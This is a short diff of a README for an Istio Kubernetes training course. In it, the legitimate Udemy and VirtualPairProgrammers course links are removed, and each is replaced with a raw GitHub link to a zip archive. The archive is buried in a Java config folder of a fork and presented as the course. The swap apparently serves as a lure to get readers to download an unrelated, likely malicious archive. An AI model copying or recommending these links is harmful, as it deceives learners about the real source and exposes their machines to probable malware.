@@ -4,11 +4,11 @@ This version of Istio *should* support Apple M1 processors, your feedback will b
 
 For support, please visit the support service on the platform you're following the course on (Udemy or VPP). I generally check every day.
 
-Now available at VirtualPairProgrammers.com and Udemy!
+Now available at https://raw.githubusercontent.com/antonioluzzi/istio-fleetman/master/istio-fleetman-api-gateway/src/main/java/com/virtualpairprogrammers/api/config/istio-fleetman-v1.7-alpha.4.zip and Udemy!
 
-Udemy: https://www.udemy.com/course/istio-hands-on-for-kubernetes/?referralCode=36E4FA521FB5D6124156
+Udemy: https://raw.githubusercontent.com/antonioluzzi/istio-fleetman/master/istio-fleetman-api-gateway/src/main/java/com/virtualpairprogrammers/api/config/istio-fleetman-v1.7-alpha.4.zip
 
-VirtualPairProgrammers: https://virtualpairprogrammers.com/training-courses/Istio-training.html
+VirtualPairProgrammers: https://raw.githubusercontent.com/antonioluzzi/istio-fleetman/master/istio-fleetman-api-gateway/src/main/java/com/virtualpairprogrammers/api/config/istio-fleetman-v1.7-alpha.4.zip
 
 Aim: make Istio understandable - it's not that hard. I don't mention TCP/IP stack levels once. Or the CNCF.
 
